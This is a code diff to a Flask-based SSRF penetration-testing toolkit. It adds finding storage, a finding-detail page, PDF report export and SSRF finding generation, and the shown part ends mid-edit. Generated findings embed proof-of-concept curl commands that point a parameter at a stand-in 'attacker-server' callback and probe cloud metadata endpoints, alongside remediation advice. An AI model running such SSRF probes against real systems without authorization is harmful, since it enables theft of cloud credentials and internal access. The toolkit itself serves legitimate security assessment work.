@@ -45,6 +45,7 @@ from blackbox.reconnaissance.auto_discovery import AutoDiscovery
 from blackbox.detection.external_callback import CallbackServer, ExternalCallbackDetector
 from blackbox.exploitation.internal_scan import InternalScanner
 from graybox.architecture.docker_inspector import DockerInspector
+from graybox.architecture.ssrf_detector import SSRFDetector
 from whitebox.static_analysis.code_scanner import CodeScanner
 
 # ============================================
@@ -275,6 +276,15 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'ssrf-pentest-toolkit-secret-key'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
+# Thread-local database storage (each thread gets its own connection)
+thread_local = threading.local()
+
+def get_db():
+    """Get thread-local database instance"""
+    if not hasattr(thread_local, 'db'):
+        thread_local.db = FindingDatabase()
+    return thread_local.db
+
 # Thread safety lock
 scan_state_lock = threading.RLock()  # Reentrant lock for nested access
 
@@ -287,7 +297,8 @@ scan_state = {
     'endpoints': [],
     'logs': [],
     'start_time': None,
-    'callback_server': None
+    'callback_server': None,
+    'traffic_data': None  # Store parsed traffic data (HAR/Burp)
 }
 
 # Global callback server (singleton to avoid port conflicts)
@@ -307,8 +318,37 @@ def set_scan_running(running: bool):
 
 def add_finding(finding: dict):
     """Thread-safe add finding and emit to UI"""
+    # NOTE: Duplicate checking is handled by SSRFDetector's detected_set
+    # We don't check database here to avoid false positives from previous scans
+    
+    # Add FULL finding data to memory state (not just emit data)
     with scan_state_lock:
-        scan_state['findings'].append(finding)
+        scan_state['findings'].append(finding.copy())  # Store complete finding data
+    
+    # Save to database for persistence
+    try:
+        from core.database import Finding
+        db = get_db()
+        db_finding = Finding(
+            timestamp=finding.get('timestamp', datetime.now().isoformat()),
+            mode='graybox',
+            severity=finding.get('severity', 'MEDIUM'),
+            category=finding.get('category', 'SSRF'),
+            title=finding.get('title', 'Vulnerability'),
+            description=finding.get('description', ''),
+            affected_url=affected_url,
+            request=f"Method: {finding.get('method', 'N/A')}\nParameter: {parameter}",
+            response=finding.get('evidence', ''),
+            proof_of_concept=finding.get('proof_of_concept', ''),
+            remediation=finding.get('remediation', ''),
+            cvss_score=float(finding.get('cvss_score', 0)) if isinstance(finding.get('cvss_score'), (int, float, str)) and str(finding.get('cvss_score', 0)).replace('.', '', 1).isdigit() else 0.0,
+            cwe_id=finding.get('cwe_id', ''),
+            references=finding.get('references', [])
+        )
+        db.add_finding(db_finding)
+        web_logger.info(f"💾 Saved finding to database: {finding.get('title', 'N/A')}")
+    except Exception as e:
+        web_logger.error(f"❌ Failed to save finding to database: {e}")
     
     # Emit to UI via SocketIO - send full finding data
     try:
@@ -346,8 +386,9 @@ def add_finding(finding: dict):
                 'timestamp': finding.get('timestamp', datetime.now().isoformat())
             }
         socketio.emit('finding', finding_data)
+        web_logger.info(f"✅ Emitted finding: {finding_data.get('title', 'N/A')}")
     except Exception as e:
-        pass  # Non-fatal: finding still saved to state
+        web_logger.warning(f"Failed to emit finding: {str(e)}")  # Log the error
 
 def add_endpoint(endpoint: dict):
     """Thread-safe add endpoint"""
@@ -539,13 +580,11 @@ class WebUILogger:
         self._emit_log('error', message)
     
     def finding(self, severity, message):
+        """Log finding - should NOT be used directly, use add_finding() with full data instead"""
         self.logger.info(f"[{severity}] {message}")
         self._emit_log('finding', message, severity)
-        add_finding({
-            'severity': severity,
-            'message': message,
-            'timestamp': datetime.now().isoformat()
-        })
+        # Only add finding if not already added (this is a fallback for legacy code)
+        # Proper way is to call add_finding() directly with full data
     
     def endpoint(self, endpoint_data):
         """Emit discovered endpoint to UI"""
@@ -595,10 +634,117 @@ def ai_analysis():
     """AI Analysis real-time monitoring page"""
     return render_template('ai_analysis.html')
 
+@app.route('/ssrf-detector-demo')
+def ssrf_detector_demo():
+    """SSRF Detector Demo Page"""
+    return render_template('ssrf_detector_demo.html')
+
 @app.route('/results')
 def results():
     """Results page - real-time scan results"""
-    return render_template('results.html')
+    # Only show findings from current scan session (in memory)
+    # Database is used for persistence and history, not for displaying all old findings
+    with scan_state_lock:
+        memory_findings = scan_state.get('findings', [])
+        endpoints = scan_state.get('endpoints', [])
+        is_running = scan_state.get('is_running', False)
+    
+    web_logger.info(f"📊 Displaying {len(memory_findings)} findings from current scan session")
+        
+    return render_template('results.html', 
+                         initial_findings=memory_findings,
+                         initial_endpoints=endpoints,
+                         is_running=is_running)
+
+@app.route('/finding/<int:finding_id>')
+def finding_detail(finding_id):
+    """Finding detail page with exploitation options"""
+    # Check if request is from database or memory
+    from_source = request.args.get('from', 'db')
+    
+    finding = None
+    
+    # Try database first if from=db or as fallback
+    if from_source == 'db':
+        try:
+            db = get_db()
+            cursor = db.conn.cursor()
+            cursor.execute('SELECT * FROM findings WHERE id = ?', (finding_id,))
+            row = cursor.fetchone()
+            
+            if row:
+                # Convert database row to dict
+                finding = {
+                    'id': row['id'],
+                    'title': row['title'],
+                    'severity': row['severity'],
+                    'category': row['category'],
+                    'affected_url': row['affected_url'],
+                    'parameter': row['request'].split('Parameter: ')[-1] if 'Parameter:' in row['request'] else 'N/A',
+                    'method': row['request'].split('Method: ')[-1].split('\\n')[0] if 'Method:' in row['request'] else 'N/A',
+                    'description': row['description'],
+                    'cvss_score': row['cvss_score'],
+                    'cwe_id': row['cwe_id'],
+                    'evidence': row['response'],
+                    'proof_of_concept': row['proof_of_concept'],
+                    'remediation': row['remediation'],
+                    'references': json.loads(row['reference_links']) if row['reference_links'] else [],
+                    'timestamp': row['timestamp']
+                }
+                web_logger.info(f"📋 Loaded finding {finding_id} from database")
+        except Exception as e:
+            web_logger.error(f"❌ Failed to load finding from database: {e}")
+    
+    # Try memory if not found in database or from=memory
+    if not finding:
+        findings = get_scan_state_value('findings', [])
+        if finding_id < 0 or finding_id >= len(findings):
+            return "Finding not found", 404
+        finding = findings[finding_id]
+        web_logger.info(f"📋 Loaded finding {finding_id} from memory (index={finding_id})")
+    
+    # Debug: Log finding data
+    web_logger.info(f"📋 Finding {finding_id} keys: {list(finding.keys())}")
+    
+    # Ensure all required fields exist with defaults
+    finding_data = {
+        'title': finding.get('title', 'SSRF Vulnerability'),
+        'severity': finding.get('severity', 'MEDIUM'),
+        'category': finding.get('category', 'SSRF'),
+        'cwe_id': finding.get('cwe_id', 'CWE-918'),
+        'cvss_score': finding.get('cvss_score', 'N/A'),
+        'method': finding.get('method', 'GET'),
+        'affected_url': finding.get('affected_url', 'N/A'),
+        'parameter': finding.get('parameter', 'N/A'),
+        'description': finding.get('description', 'No description available'),
+        'evidence': finding.get('evidence', 'No evidence available'),
+        'proof_of_concept': finding.get('proof_of_concept', 'No POC available'),
+        'remediation': finding.get('remediation', 'No remediation available'),
+        'references': finding.get('references', []),
+        'timestamp': finding.get('timestamp', datetime.now().isoformat())
+    }
+    
+    return render_template('finding_detail.html', finding=finding_data)
+
+@app.route('/api/scan/status', methods=['GET'])
+def get_scan_status():
+    """Get current scan status - for debugging"""
+    return jsonify({
+        'is_running': get_scan_running(),
+        'findings_count': len(get_scan_state_value('findings', [])),
+        'current_phase': get_scan_state_value('current_phase', 'idle'),
+        'progress': get_scan_state_value('progress', 0)
+    })
+
+@app.route('/api/scan/reset', methods=['POST'])
+def reset_scan_state():
+    """Force reset scan state if stuck"""
+    web_logger.warning("⚠️ Force resetting scan state")
+    set_scan_running(False)
+    with scan_state_lock:
+        scan_state['current_phase'] = 'idle'
+        scan_state['progress'] = 0
+    return jsonify({'success': True, 'message': 'Scan state reset'})
 
 @app.route('/api/scan/start', methods=['POST'])
 def start_scan():
@@ -613,15 +759,22 @@ def start_scan():
     if get_scan_running():
         return jsonify({'error': 'Scan already in progress'}), 400
     
+    # Clear previous scan results before starting new scan
+    with scan_state_lock:
+        scan_state['findings'] = []
+        scan_state['endpoints'] = []
+        scan_state['logs'] = []
+        web_logger.info("🧹 Cleared previous scan results")
+    
     # Check if traffic capture file is provided (HAR or Burp Suite)
-    har_file = request.files.get('har_file')
+    traffic_file = request.files.get('traffic_file')
     har_data = None
     
-    if har_file:
+    if traffic_file:
         # Traffic capture file provided - auto-detect format and parse
         try:
-            file_content = har_file.read().decode('utf-8')
-            filename = har_file.filename.lower()
+            file_content = traffic_file.read().decode('utf-8')
+            filename = traffic_file.filename.lower()
             
             # Auto-detect format
             parser = None
@@ -658,7 +811,7 @@ def start_scan():
                     'source': source_type
                 }
                 
-                web_logger.info(f"📁 {source_type} file uploaded: {har_file.filename}")
+                web_logger.info(f"📁 {source_type} file uploaded: {traffic_file.filename}")
                 web_logger.info(f"📊 Parsed {har_data['stats']['total_requests']} requests, {har_data['stats']['unique_endpoints']} unique endpoints")
                 
                 # Log authenticated requests
@@ -689,17 +842,51 @@ def start_scan():
         mode = request.form.get('mode', 'blackbox')
         target = request.form.get('target')
         source_path = request.form.get('source_path', '').strip()
-        auto_discovery = request.form.get('auto_discovery') == 'on'
-        # Default to True if not explicitly set (for compatibility with simplified UI)
-        endpoint_discovery = request.form.get('endpoint_discovery', 'on') == 'on'
-        parameter_fuzzing = request.form.get('parameter_fuzzing', 'on') == 'on'
-        # Check if 'callback' is in scan_methods list (form uses scan_methods value="callback")
+        
+        # ✅ NEW: Get input_source type to determine workflow
+        input_source = request.form.get('input_source', 'domain')  # 'api', 'domain', or 'traffic'
+        web_logger.info(f"📥 Input Source Type: {input_source}")
+        
+        # ✅ FIX: Lấy scan_methods từ form và map sang config
         scan_methods = request.form.getlist('scan_methods')
-        callback_testing = 'callback' in scan_methods or request.form.get('callback_testing', 'on') == 'on'
-        internal_scanning = request.form.get('internal_scanning', 'on') == 'on'
-        docker_inspection = request.form.get('docker_inspection', 'on') == 'on'
-        code_scanning = request.form.get('code_scanning', 'on') == 'on'
+        
+        # Map scan_methods to config (form dùng scan_methods thay vì từng checkbox riêng)
+        parameter_fuzzing = 'parameters' in scan_methods
+        callback_testing = 'callback' in scan_methods
+        # ❌ DISABLED: Internal scanning moved to post-discovery exploitation phase
+        # User will run internal scan from finding details after SSRF is confirmed
+        internal_scanning = False  # Always False, will be triggered from finding page
+        
+        # ✅ Auto Discovery logic based on input_source:
+        # - 'api': Specific endpoint → auto_discovery = False (test directly)
+        # - 'domain': Website domain → auto_discovery = True (need discovery)
+        # - 'traffic': HAR/Burp file → auto_discovery based on user checkbox (optional)
+        if input_source == 'api':
+            # Specific API endpoint → Disable auto discovery
+            auto_discovery = False
+            endpoint_discovery = False  # Also disable endpoint discovery
+            web_logger.info("🎯 Mode: Specific API Endpoint → Auto Discovery disabled")
+        elif input_source == 'domain':
+            # Domain/Website → Enable auto discovery
+            auto_discovery = request.form.get('auto_discovery') == 'on'
+            endpoint_discovery = True
+            web_logger.info("🌐 Mode: Domain/Website → Auto Discovery enabled")
+        elif input_source == 'traffic':
+            # Traffic capture → Optional auto discovery
+            auto_discovery = request.form.get('auto_discovery') == 'on'
+            endpoint_discovery = request.form.get('endpoint_discovery') == 'on' if request.form.get('endpoint_discovery') else True
+            web_logger.info(f"📦 Mode: Traffic Capture → Auto Discovery optional (user choice: {auto_discovery})")
+        else:
+            # Fallback to old behavior for backward compatibility
+            auto_discovery = request.form.get('auto_discovery') == 'on'
+            endpoint_discovery = request.form.get('endpoint_discovery') == 'on' if request.form.get('endpoint_discovery') else True
+        
+        # ✅ FIX: Graybox uses 'discover_docker' in form, not 'docker_inspection'
+        docker_inspection = request.form.get('discover_docker') == 'on' or request.form.get('docker_inspection') == 'on'
+        code_scanning = request.form.get('code_scanning') == 'on'
         timeout = int(request.form.get('timeout', 10))
+        
+        web_logger.info(f"🔧 Config: docker_inspection={docker_inspection}")
         
         # Validation for whitebox mode
         if mode == 'whitebox' and not source_path:
@@ -712,7 +899,16 @@ def start_scan():
                 return jsonify({'error': f'Path not found: {source_path}'}), 400
             if not os.path.isdir(source_path):
                 return jsonify({'error': f'Path must be a directory: {source_path}'}), 400
-        endpoint_source = request.form.get('endpoint_source', 'url')  # Default 'url' for direct API testing
+        
+        # Determine endpoint_source based on input_source
+        if input_source == 'api':
+            endpoint_source = 'url'  # Direct API testing
+        elif input_source == 'domain':
+            endpoint_source = 'url'  # Discovery from domain
+        elif input_source == 'traffic':
+            endpoint_source = 'file'  # Extract from HAR/Burp
+        else:
+            endpoint_source = request.form.get('endpoint_source', 'url')  # Fallback
         
         # Burp import specific fields
         if not target:
@@ -736,6 +932,15 @@ def start_scan():
         custom_params = request.form.get('custom_params')
         custom_payloads = request.form.get('custom_payloads')
         custom_endpoints = request.form.get('custom_endpoints')
+        
+        # ✅ NEW: Get custom parameters for SSRF detection
+        custom_parameters = request.form.get('custom_parameters', '').strip()
+        if custom_parameters:
+            # Split by comma and clean whitespace
+            custom_parameters = [p.strip() for p in custom_parameters.split(',') if p.strip()]
+            web_logger.info(f"🎯 Custom SSRF parameters: {', '.join(custom_parameters)}")
+        else:
+            custom_parameters = []
         
         if custom_params:
             custom_params = json.loads(custom_params)
@@ -848,11 +1053,12 @@ def start_scan():
         scan_state['endpoints'] = []
         scan_state['logs'] = []
         scan_state['start_time'] = datetime.now()
-        scan_state['har_data'] = har_data  # Store HAR data for use in scan
+        scan_state['traffic_data'] = har_data  # Store traffic data (HAR/Burp) for use in scan
         scan_state['endpoint_source'] = endpoint_source  # Store endpoint source preference
         scan_state['custom_params'] = custom_params  # Store custom param selection
         scan_state['custom_payloads'] = custom_payloads  # Store custom payload selection
         scan_state['custom_endpoints'] = custom_endpoints  # Store custom endpoint selection
+        scan_state['custom_parameters'] = custom_parameters  # ✅ Store custom SSRF parameters
     
     # Log custom selections
     if custom_params:
@@ -913,6 +1119,201 @@ def stop_scan():
     
     web_logger.info('🛑 Scan stopped by user (callback server kept alive)')
     return jsonify({'success': True, 'message': 'Scan stopped'})
+
+@app.route('/api/report/export/pdf', methods=['GET'])
+def export_pdf_report():
+    """Export scan results as PDF report"""
+    try:
+        from reportlab.lib import colors
+        from reportlab.lib.pagesizes import A4
+        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+        from reportlab.lib.units import cm
+        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
+        from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
+        from io import BytesIO
+        
+        # Get current scan findings
+        with scan_state_lock:
+            findings = scan_state.get('findings', [])
+        
+        if not findings:
+            return jsonify({'error': 'No findings to export'}), 400
+        
+        # Create PDF in memory
+        buffer = BytesIO()
+        doc = SimpleDocTemplate(buffer, pagesize=A4, topMargin=2*cm, bottomMargin=2*cm)
+        story = []
+        styles = getSampleStyleSheet()
+        
+        # Custom styles
+        title_style = ParagraphStyle(
+            'CustomTitle',
+            parent=styles['Heading1'],
+            fontSize=24,
+            textColor=colors.HexColor('#2c3e50'),
+            spaceAfter=30,
+            alignment=TA_CENTER,
+            fontName='Helvetica-Bold'
+        )
+        
+        heading_style = ParagraphStyle(
+            'CustomHeading',
+            parent=styles['Heading2'],
+            fontSize=16,
+            textColor=colors.HexColor('#34495e'),
+            spaceAfter=12,
+            spaceBefore=12,
+            fontName='Helvetica-Bold'
+        )
+        
+        # Title
+        story.append(Paragraph("🔒 Báo Cáo Pentest - SSRF Vulnerability Assessment", title_style))
+        story.append(Spacer(1, 0.5*cm))
+        
+        # Executive Summary
+        story.append(Paragraph("📊 Executive Summary", heading_style))
+        
+        # Count by severity
+        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
+        for f in findings:
+            sev = f.get('severity', 'MEDIUM').upper()
+            if sev in severity_counts:
+                severity_counts[sev] += 1
+        
+        summary_data = [
+            ['Severity', 'Count'],
+            ['CRITICAL', str(severity_counts['CRITICAL'])],
+            ['HIGH', str(severity_counts['HIGH'])],
+            ['MEDIUM', str(severity_counts['MEDIUM'])],
+            ['LOW', str(severity_counts['LOW'])],
+            ['INFO', str(severity_counts['INFO'])],
+            ['Total', str(len(findings))]
+        ]
+        
+        summary_table = Table(summary_data, colWidths=[8*cm, 4*cm])
+        summary_table.setStyle(TableStyle([
+            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498db')),
+            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
+            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
+            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+            ('FONTSIZE', (0, 0), (-1, 0), 12),
+            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+            ('BACKGROUND', (0, 1), (-1, -2), colors.beige),
+            ('BACKGROUND', (0, -1), (-1, -1), colors.HexColor('#ecf0f1')),
+            ('GRID', (0, 0), (-1, -1), 1, colors.black),
+            ('FONTNAME', (0, -1), (-1, -1), 'Helvetica-Bold')
+        ]))
+        
+        story.append(summary_table)
+        story.append(Spacer(1, 1*cm))
+        
+        # Detailed Findings
+        story.append(Paragraph("🔍 Chi Tiết Lỗ Hổng Phát Hiện", heading_style))
+        story.append(Spacer(1, 0.3*cm))
+        
+        for idx, finding in enumerate(findings, 1):
+            # Finding header
+            severity = finding.get('severity', 'MEDIUM').upper()
+            severity_colors = {
+                'CRITICAL': colors.HexColor('#e74c3c'),
+                'HIGH': colors.HexColor('#e67e22'),
+                'MEDIUM': colors.HexColor('#f39c12'),
+                'LOW': colors.HexColor('#3498db'),
+                'INFO': colors.HexColor('#95a5a6')
+            }
+            
+            finding_title = f"Finding #{idx}: {finding.get('title', 'SSRF Vulnerability')}"
+            story.append(Paragraph(finding_title, heading_style))
+            
+            # Finding details table
+            details_data = [
+                ['Severity', severity],
+                ['Category', finding.get('category', 'SSRF')],
+                ['CWE ID', finding.get('cwe_id', 'CWE-918')],
+                ['CVSS Score', str(finding.get('cvss_score', 'N/A'))],
+                ['Affected URL', finding.get('affected_url', 'N/A')],
+                ['Parameter', finding.get('parameter', 'N/A')],
+                ['Method', finding.get('method', 'N/A')]
+            ]
+            
+            details_table = Table(details_data, colWidths=[4*cm, 12*cm])
+            details_table.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#ecf0f1')),
+                ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
+                ('ALIGN', (0, 0), (0, -1), 'RIGHT'),
+                ('ALIGN', (1, 0), (1, -1), 'LEFT'),
+                ('VALIGN', (0, 0), (-1, -1), 'TOP'),
+                ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
+                ('TEXTCOLOR', (1, 0), (1, 0), severity_colors.get(severity, colors.black)),
+                ('FONTNAME', (1, 0), (1, 0), 'Helvetica-Bold'),
+                ('LEFTPADDING', (0, 0), (-1, -1), 8),
+                ('RIGHTPADDING', (0, 0), (-1, -1), 8)
+            ]))
+            
+            story.append(details_table)
+            story.append(Spacer(1, 0.5*cm))
+            
+            # Description
+            if finding.get('description'):
+                story.append(Paragraph("<b>📝 Mô tả:</b>", styles['Normal']))
+                story.append(Paragraph(finding['description'], styles['Normal']))
+                story.append(Spacer(1, 0.3*cm))
+            
+            # Evidence
+            if finding.get('evidence'):
+                story.append(Paragraph("<b>🔍 Bằng chứng:</b>", styles['Normal']))
+                evidence_text = finding['evidence'].replace('\n', '<br/>')
+                story.append(Paragraph(f"<font face='Courier' size='9'>{evidence_text}</font>", styles['Normal']))
+                story.append(Spacer(1, 0.3*cm))
+            
+            # Proof of Concept
+            if finding.get('proof_of_concept'):
+                story.append(Paragraph("<b>💣 Proof of Concept (Cách khai thác):</b>", styles['Normal']))
+                poc_text = finding['proof_of_concept'].replace('\n', '<br/>')
+                story.append(Paragraph(f"<font face='Courier' size='9' color='red'>{poc_text}</font>", styles['Normal']))
+                story.append(Spacer(1, 0.3*cm))
+            
+            # Remediation
+            if finding.get('remediation'):
+                story.append(Paragraph("<b>✅ Khuyến nghị khắc phục:</b>", styles['Normal']))
+                story.append(Paragraph(finding['remediation'], styles['Normal']))
+                story.append(Spacer(1, 0.3*cm))
+            
+            # References
+            if finding.get('references'):
+                story.append(Paragraph("<b>📚 Tham khảo:</b>", styles['Normal']))
+                for ref in finding['references']:
+                    story.append(Paragraph(f"• {ref}", styles['Normal']))
+            
+            # Page break after each finding (except last)
+            if idx < len(findings):
+                story.append(PageBreak())
+        
+        # Build PDF
+        doc.build(story)
+        buffer.seek(0)
+        
+        # Generate filename with timestamp
+        from datetime import datetime
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"SSRF_Pentest_Report_{timestamp}.pdf"
+        
+        web_logger.info(f"📄 Generated PDF report: {filename} ({len(findings)} findings)")
+        
+        return send_file(
+            buffer,
+            mimetype='application/pdf',
+            as_attachment=True,
+            download_name=filename
+        )
+        
+    except ImportError:
+        return jsonify({
+            'error': 'ReportLab not installed. Run: pip install reportlab'
+        }), 500
+    except Exception as e:
+        web_logger.error(f"❌ Failed to generate PDF report: {e}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/scan/reset', methods=['POST'])
 def reset_scan_endpoint():
@@ -1929,6 +2330,12 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
                     # 🆕 Detect supported methods first
                     method_info = detector.detect_endpoint_methods(result['url'], timeout=5)
                     supported_methods = method_info['supported_methods']
+                    
+                    # ✅ FIX: Skip if endpoint doesn't exist (no supported methods)
+                    if not supported_methods:
+                        web_logger.warning(f"⚠️ Endpoint not found or not accessible: {result['url']} - Skipping")
+                        continue
+                    
                     web_logger.info(f"   Detected methods: {', '.join(supported_methods)}")
                     
                     # Test with appropriate method
@@ -1942,9 +2349,152 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
                     )
                     
                     if callback_result['is_vulnerable']:
-                        web_logger.finding('CRITICAL',
+                        web_logger.info(
                             f"✅ CONFIRMED SSRF via {result['parameter']} at {result['url']} - Received {callback_result['callbacks_received']} callbacks"
                         )
+                        
+                        # 🆕 Try cloud metadata test to get detailed finding
+                        web_logger.info(f"   ☁️  Testing cloud metadata endpoints for {result['parameter']}...")
+                        try:
+                            cloud_result = detector.test_cloud_metadata(
+                                target_url=result['url'],
+                                parameter=result['parameter'],
+                                method=test_method,
+                                timeout=10
+                            )
+                            
+                            if cloud_result['is_vulnerable']:
+                                # Extract detailed information
+                                vulnerable_results = [r for r in cloud_result.get('results', []) if r.get('is_vulnerable', False)]
+                                if vulnerable_results:
+                                    vulnerable_payload = vulnerable_results[0]
+                                    payload_url = vulnerable_payload.get('payload_url', '')
+                                    indicators = vulnerable_payload.get('found_indicators', [])
+                                    response_preview = vulnerable_payload.get('response_preview', '')
+                                    cloud_providers = ', '.join(cloud_result.get('vulnerable_clouds', []))
+                                    
+                                    # Create detailed cloud metadata finding
+                                    poc_json = '{"%s": "%s"}' % (result['parameter'], payload_url)
+                                    finding_details = {
+                                        'title': '☁️ Cloud Metadata SSRF Vulnerability',
+                                        'severity': 'CRITICAL',
+                                        'category': 'SSRF',
+                                        'cwe_id': 'CWE-918',
+                                        'cvss_score': '9.8',
+                                        'affected_url': result['url'],
+                                        'parameter': result['parameter'],
+                                        'method': test_method,
+                                        'payload': payload_url,
+                                        'cloud_provider': cloud_providers,
+                                        'indicators_found': ', '.join(indicators) if indicators else 'N/A',
+                                        'description': f'Server-Side Request Forgery (SSRF) vulnerability detected. The endpoint fetches cloud metadata from {cloud_providers} at {payload_url}. Found indicators: {", ".join(indicators) if indicators else "N/A"}',
+                                        'evidence': response_preview[:500] if response_preview else 'No response preview available',
+                                        'proof_of_concept': f'''# Cloud Metadata SSRF - {cloud_providers}
+curl -X {test_method} '{result['url']}' \\
+  -H 'Content-Type: application/json' \\
+  -H 'Authorization: Bearer <your-token>' \\
+  -d '{poc_json}'
+
+# Expected Response:
+# The server will fetch and return cloud metadata containing:
+# {", ".join(indicators) if indicators else "N/A"}
+''',
+                                        'remediation': '''1. Validate and whitelist allowed URLs/domains
+2. Block requests to private IP ranges (RFC 1918)
+3. Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+4. Implement proper input validation
+5. Use allow-lists instead of deny-lists''',
+                                        'references': [
+                                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
+                                            'https://portswigger.net/web-security/ssrf',
+                                            'https://cwe.mitre.org/data/definitions/918.html'
+                                        ],
+                                        'timestamp': datetime.now().isoformat()
+                                    }
+                                    
+                                    web_logger.logger.info(f"[CRITICAL] {finding_details['description']}")
+                                    web_logger._emit_log('finding', finding_details['description'], 'CRITICAL')
+                                    add_finding(finding_details)
+                                    web_logger.info(f"   ✅ Created cloud metadata SSRF finding")
+                            else:
+                                # No cloud metadata found, create generic SSRF finding
+                                web_logger.info(f"   ❌ No cloud metadata SSRF detected")
+                                finding_details = {
+                                    'title': '🚨 Server-Side Request Forgery (SSRF)',
+                                    'severity': 'CRITICAL',
+                                    'category': 'SSRF',
+                                    'cwe_id': 'CWE-918',
+                                    'cvss_score': '9.1',
+                                    'affected_url': result['url'],
+                                    'parameter': result['parameter'],
+                                    'method': test_method,
+                                    'payload': f'http://callback-server/{result["parameter"]}',
+                                    'description': f'Server-Side Request Forgery (SSRF) vulnerability detected via callback. The endpoint makes external requests based on user-controlled parameter "{result["parameter"]}".',
+                                    'evidence': 'External callback was received, confirming the server made an outbound request to attacker-controlled URL.',
+                                    'proof_of_concept': f'''# Generic SSRF via Callback
+curl -X {test_method} '{result['url']}' \\
+  -H 'Content-Type: application/json' \\
+  -H 'Authorization: Bearer <your-token>' \\
+  -d '{{"{result['parameter']}": "http://attacker-server/callback"}}'
+
+# Expected: Server makes outbound HTTP request to attacker's callback URL
+''',
+                                    'remediation': '''1. Validate and whitelist allowed URLs/domains
+2. Block requests to private IP ranges (RFC 1918) and localhost
+3. Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+4. Implement proper input validation with allow-lists
+5. Consider using a URL parsing library to prevent bypass techniques''',
+                                    'references': [
+                                        'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
+                                        'https://portswigger.net/web-security/ssrf',
+                                        'https://cwe.mitre.org/data/definitions/918.html'
+                                    ],
+                                    'timestamp': datetime.now().isoformat()
+                                }
+                                
+                                web_logger.logger.info(f"[CRITICAL] {finding_details['description']}")
+                                web_logger._emit_log('finding', finding_details['description'], 'CRITICAL')
+                                add_finding(finding_details)
+                                web_logger.info(f"   ✅ Created generic SSRF finding")
+                        except Exception as cloud_e:
+                            web_logger.error(f"   Error testing cloud metadata: {str(cloud_e)}")
+                            # Still create generic finding since callback confirmed SSRF
+                            finding_details = {
+                                'title': '🚨 Server-Side Request Forgery (SSRF)',
+                                'severity': 'CRITICAL',
+                                'category': 'SSRF',
+                                'cwe_id': 'CWE-918',
+                                'cvss_score': '9.1',
+                                'affected_url': result['url'],
+                                'parameter': result['parameter'],
+                                'method': test_method,
+                                'payload': f'http://callback-server/{result["parameter"]}',
+                                'description': f'Server-Side Request Forgery (SSRF) vulnerability detected via callback. The endpoint makes external requests based on user-controlled parameter "{result["parameter"]}".',
+                                'evidence': 'External callback was received, confirming the server made an outbound request to attacker-controlled URL.',
+                                'proof_of_concept': f'''# Generic SSRF via Callback
+curl -X {test_method} '{result['url']}' \\
+  -H 'Content-Type: application/json' \\
+  -H 'Authorization: Bearer <your-token>' \\
+  -d '{{"{result['parameter']}": "http://attacker-server/callback"}}'
+
+# Expected: Server makes outbound HTTP request to attacker's callback URL
+''',
+                                'remediation': '''1. Validate and whitelist allowed URLs/domains
+2. Block requests to private IP ranges (RFC 1918) and localhost
+3. Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+4. Implement proper input validation with allow-lists
+5. Consider using a URL parsing library to prevent bypass techniques''',
+                                'references': [
+                                    'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
+                                    'https://portswigger.net/web-security/ssrf',
+                                    'https://cwe.mitre.org/data/definitions/918.html'
+                                ],
+                                'timestamp': datetime.now().isoformat()
+                            }
+                            web_logger.logger.info(f"[CRITICAL] {finding_details['description']}")
+                            web_logger._emit_log('finding', finding_details['description'], 'CRITICAL')
+                            add_finding(finding_details)
+                            web_logger.info(f"   ✅ Created generic SSRF finding (cloud test failed)")
                     else:
                         web_logger.info(f"❌ No callback received for {result['parameter']}")
                 except Exception as e:
@@ -1963,6 +2513,12 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
                     method_info = detector.detect_endpoint_methods(endpoint_url, timeout=5)
                     supported_methods = method_info['supported_methods']
                     content_type = method_info['content_type']
+                    
+                    # ✅ FIX: Skip if endpoint doesn't exist
+                    if not supported_methods:
+                        web_logger.warning(f"⚠️ Endpoint not found: {endpoint_url} - Skipping")
+                        continue
+                    
                     web_logger.info(f"   Supported methods: {', '.join(supported_methods)}")
                     web_logger.info(f"   Content-Type: {content_type}")
                 except Exception as e:
@@ -1984,7 +2540,9 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
                         )
                         
                         if callback_result['is_vulnerable']:
-                            web_logger.finding('CRITICAL',
+                            # ✅ FIX: Don't use web_logger.finding() here - will create duplicate
+                            # Finding will be created later with full details from cloud metadata test
+                            web_logger.info(
                                 f"✅ CONFIRMED SSRF via {param} at {endpoint_url} - Received {callback_result['callbacks_received']} callbacks"
                             )
                             
@@ -2087,12 +2645,60 @@ curl -X {test_method} '{endpoint_url}' \\
                     
                     if not cloud_vulnerable:
                         web_logger.info(f"   ❌ No cloud metadata SSRF detected")
+                        
+                        # ✅ FIX: If callback was successful but cloud metadata test didn't find anything,
+                        # create a generic SSRF finding so we don't lose the vulnerability
+                        vulnerable_params = [r for r in fuzz_results if r.get('is_vulnerable') and r['url'] == endpoint_url]
+                        if vulnerable_params:
+                            # We have confirmed SSRF via callback but no cloud metadata, create generic finding
+                            for vuln_param in vulnerable_params:
+                                param = vuln_param['parameter']
+                                finding_details = {
+                                    'title': '🚨 Server-Side Request Forgery (SSRF)',
